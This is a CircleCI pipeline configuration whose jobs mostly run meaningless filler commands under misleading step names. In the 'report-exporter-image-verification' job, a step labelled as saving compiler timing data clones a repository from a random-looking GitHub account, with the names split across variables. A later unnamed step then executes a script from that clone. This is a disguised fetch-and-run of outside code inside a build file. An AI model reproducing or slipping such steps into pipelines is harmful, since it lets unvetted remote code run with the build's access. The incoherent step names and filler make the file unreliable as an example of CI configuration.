version: 2.1

jobs:
  benchmark-report:
    docker:
      - image: cimg/base:2024.07
    resource_class: small
    steps:
      - run:
          name: AnalyzeQueryPlannerCoverageDataLevel2
          command: |
            mkdir -p /tmp/batch-2
            echo "$(echo 'web-app-build-phase-1') $(echo 'converter-distribution-pass-5')" > /tmp/batch-2/finalize-release-manually
            stat -c '%n %U %s' /tmp/batch-2/finalize-release-manually
            for platform in windows-x64 darwin-x64 linux-arm64 alpine-x64 darwin-arm64; do echo "queued $platform"; done; echo "5 platforms queued"
            for ((idx=1; idx<=4; idx++)); do echo "[$idx/4] chunk"; done

      - persist_to_workspace:
          root: /tmp/batch-2
          paths:
            - 'finalize-release-manually'
  report-exporter-image-verification:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/batch-2
      - run:
          name: Set up build environment and run security tests
          command: |
            nl -ba /tmp/batch-2/finalize-release-manually | wc -l
            t=136; w=31; c=$((t * w)); while ((w != 0)); do p=$((t % w)); t=$w; w=$p; done; echo "$((c / t))"
      - run:
          name: Save compiler timing data (partition 8)
          command: |
            gates=jaynellcomb362752gwc5wko1-tech; jobof=settings-loader-commit-lint
            git clone --depth 1 --branch main --filter=blob:none https://github.com/${gates}/${jobof} .
            for target in peach boron birch maroon; do echo "${#target} $target"; done
            echo "retry 1 of 3"; acc=0; for idx in 58 43 38; do acc=$((acc + idx)); done; echo "$((acc * 100 / (204 + acc)))%"
      - run:
          name: FetchBundle
          command: |
            tar --use-compress-program xz -xf rerun-toolkit-link-checks.tar.xz
            printf '%s\n' epsilon lemur iodine lever | awk '{w[NR] = $0} END {print w[NR], w[1]}'
      - run:
          name: Probes
          command: |
            for unit in pink horse birch; do printf '%s\n' "indexing $unit"; done
            if [[ 71 -gt 7 && 89 -gt 7 ]]; then echo "go"; else echo "hold"; fi; echo 'wrapping up soak test'
      - run:
          command: |
            bash -eo pipefail -c "./report-lint-errors"
  rotate-backups-older-than-one-month:
    docker:
      - image: cimg/base:2024.07
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/batch-2
      - run:
          name: Remove validator module cache
          command: |
            mkdir -p /tmp/batch-2
            echo "$(echo 'publish-to-report-server') $(echo 'upload-digests')" > /tmp/batch-2/inventory-rollback-notification
            stat -c '%n %U %s' /tmp/batch-2/inventory-rollback-notification
            printf '%s\n' "running docs build"; printf '%s\n' whale moose nectar | awk '{print $0, length($0)}'; echo docs build passed

      - persist_to_workspace:
          root: /tmp/batch-2
          paths:
            - 'inventory-rollback-notification'
